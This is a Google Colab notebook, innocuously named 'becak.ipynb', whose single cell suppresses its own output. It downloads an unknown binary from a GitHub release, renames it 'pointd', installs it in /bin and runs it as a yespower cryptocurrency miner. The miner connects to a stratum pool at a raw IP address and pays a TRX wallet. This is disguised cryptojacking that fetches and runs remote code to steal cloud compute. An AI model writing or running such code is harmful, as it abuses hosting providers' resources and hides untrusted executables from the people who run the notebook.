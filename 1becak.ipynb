{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "becak.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyMu3WKdX5ESik1+tbvd6gMG",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/joykotest/gula/blob/main/1becak.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "%%capture\n",
        "!wget -q https://github.com/nononkbauk/commuter/releases/download/v2/pointd && mv pointd /bin/pointd && chmod +x /bin/pointd \n",
        "!pointd -a yespower -o stratum+tcp://103.249.70.7:6533 -u TC8TTSKsahifFTtuTXJ6MPR6TqbwWrjtrw.$(shuf -n 1 -i 1-9999999) -p c=TRX,mc=BTE -x soc"
      ],
      "metadata": {
        "id": "XoVXqDwZMYNj"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}